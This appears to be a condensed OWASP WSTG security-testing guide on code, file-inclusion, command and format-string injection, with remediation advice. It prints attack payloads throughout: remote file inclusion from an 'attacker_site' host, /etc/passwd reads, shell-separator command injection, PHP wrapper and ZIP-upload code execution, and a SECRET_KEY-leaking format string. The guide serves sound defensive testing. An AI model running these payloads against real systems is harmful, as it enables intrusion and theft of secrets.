# WSTG INPV — Code, Command & Format-String Injection

OWASP WSTG v4.2. Input Validation subset. Tests WSTG-INPV-11, 12, 13.

## Table of Contents

- [INPV-11 Code Injection](#wstg-inpv-11)
- [INPV-12 Command Injection](#wstg-inpv-12)
- [INPV-13 Format String Injection](#wstg-inpv-13)

---

## WSTG-INPV-11

**Testing for Code Injection**

Goal: find input that gets processed as dynamic code, or as an included file, by the server-side scripting engine (PHP, ASP, JSP...).

Black-box (PHP): pass a full URL where the app expects a filename to include:
```
http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a
```

Gray-box (ASP): look for user input written straight into an execution path, e.g. code that writes `Request("Data")` to a file and then `Server.Execute()`s it.

Refs: Reviewing Code for OS Injection (OWASP).

### Local File Inclusion (LFI)

Goal: find an include/require path built from unsanitized user input, letting an attacker read arbitrary local files or, with the right wrapper, execute code.

Black-box: probe any param that looks like a filename:
```
http://vulnerable_host/preview.php?file=example.html
http://vulnerable_host/preview.php?file=../../../../etc/passwd
```
A successful read returns `/etc/passwd` contents. If the app appends an extension (`include($_GET['file'].".php")`), bypass techniques include:

| Technique | How |
|---|---|
| Null byte injection | append `%00` to truncate the string before the forced extension (legacy PHP) |
| Path/dot truncation | pad the path past PHP's ~4096-byte filename limit so the appended extension gets silently dropped |
| PHP wrappers | abuse a built-in stream wrapper instead of fighting the extension |

PHP wrappers worth trying once LFI is confirmed:

| Wrapper | Use |
|---|---|
| `php://filter/convert.base64-encode/resource=FILE` | read source of a file that would otherwise execute (e.g. dump PHP source as base64) |
| `zip://path/to/file.zip%23internal_file` | execute an arbitrary file smuggled inside an uploaded ZIP (rename to bypass extension checks, e.g. upload as `.jpg`) |
| `data://text/plain;base64,BASE64_PAYLOAD` | inject arbitrary PHP directly (requires `allow_url_include` on) |
| `expect://command` | direct command execution via stdio (rarely enabled) |

ZIP-wrapper walkthrough: create `code.php` (`<?php phpinfo(); ?>`), zip it, rename to `target.jpg`, upload as an avatar, then request `?file=zip://../avatar/target.jpg%23code` (`%23` = `#`).

Remediation: never pass user input to a filesystem include API. If unavoidable, map input to an allow-listed index/identifier and reject anything else.

Tools: kadimus, LFI Suite, OWASP ZAP.

Refs: PHP Supported Protocols and Wrappers; RFC 2397 (`data:` URL scheme); OWASP File Upload Cheat Sheet.

### Remote File Inclusion (RFI)

Goal: find an include path that accepts an external URL, letting an attacker run their own hosted code on the server.

Black-box: same param hunt as LFI, but pointing off-host:
```php
$incfile = $_REQUEST["file"];
include($incfile.".php");
```
```
http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicious_page
```
Any code in the remote file executes with the server's privileges.

Remediation: same as LFI — allow-list include targets by identifier, never by raw path/URL.

---

## WSTG-INPV-12

**Testing for Command Injection**

Goal: find input passed unsanitized into an OS shell call.

Black-box, common injection points:
```
http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|                    (Perl pipe-open)
http://sensitive/something.php?dir=%3Bcat%20/etc/passwd              (%3B = ;)
```
POST example — appending a pipe to a filename param:
```
Doc=Doc1.pdf+|+Dir c:\
```
An unsanitized handler reflects the injected command's output directly in the response — confirms the injection.

Command-separator characters and their semantics:

| Syntax | Behavior |
|---|---|
| `cmd1|cmd2` | cmd2 always runs, piped from cmd1 |
| `cmd1;cmd2` | cmd2 always runs regardless of cmd1's result |
| `cmd1||cmd2` | cmd2 runs only if cmd1 fails |
| `cmd1&&cmd2` | cmd2 runs only if cmd1 succeeds |
| `$(cmd)` | command substitution, e.g. `echo $(whoami)` |
| `>(cmd)`, `<(cmd)` | process substitution |

Gray-box — dangerous APIs to grep for:

| Language | APIs |
|---|---|
| Java | `Runtime.exec()` |
| C/C++ | `system`, `exec`, `ShellExecute` |
| Python | `exec`, `eval`, `os.system`, `os.popen`, `subprocess.popen`, `subprocess.call` |
| PHP | `system`, `shell_exec`, `exec`, `proc_open`, `eval` |

Remediation:
- Allow-list valid characters/commands rather than deny-listing (deny-lists miss cases).
- Escape/filter, at minimum: `| ; & $ > < ' \ ! >> #` on Linux; `( ) < > & * ' | = ? ; [ ] ^ ~ ! . " % @ / \ : + , \`` on Windows.
- Run the app under least-privilege permissions that can't invoke a shell at all.

Tools: OWASP WebGoat, Commix.

Refs: CWE-78; ENV33-C (*Do not call system()*).

---

## WSTG-INPV-13

**Testing for Format String Injection**

Goal: find user input concatenated directly into a format-string function, letting an attacker inject conversion specifiers to leak memory, crash the process, or (in `%n`-capable languages) corrupt memory.

| Language | Risk |
|---|---|
| C/C++ (`printf`, `fprintf`, `sprintf`), Perl (`printf`, `sprintf`) | memory write via `%n`, info disclosure via `%p`/`%s` |
| Python `str.format` | info disclosure — can reference unintended in-scope variables |
| Java `String.format`/`PrintStream.format`, PHP `printf` | runtime exception/crash on unexpected specifier |

Vulnerable pattern — user input passed as the format string itself, not as an argument:
```c
printf(userName);              // vulnerable
printf("%s", userName);        // safe
```

Black-box: fuzz any string input with conversion specifiers (URL-encode `%` and `{`):
```
https://vulnerable_host/userinfo?username=%25s%25s%25s%25n
```
A vulnerable Java endpoint throws `MissingFormatArgumentException`; a vulnerable C binary may segfault.

Tool-assisted fuzzing with wfuzz — seed file mixing a control value with C-style and Python-style specifiers:
```
alice
%s%s%s%n
%p%p%p%p%p
{event.__init__.__globals__[CONFIG][SECRET_KEY]}
```
```
wfuzz -c -z file,fuzz.txt,urlencode https://vulnerable_host/userinfo?username=FUZZ
```
Divergent response length/behavior on the specifier payloads vs. the `alice` control confirms the injection.

Static analysis tools: Flawfinder (C/C++), FindSecurityBugs `FORMAT_STRING_MANIPULATION` rule (Java), phpsa (PHP).

Refs: OWASP Format string attack page.
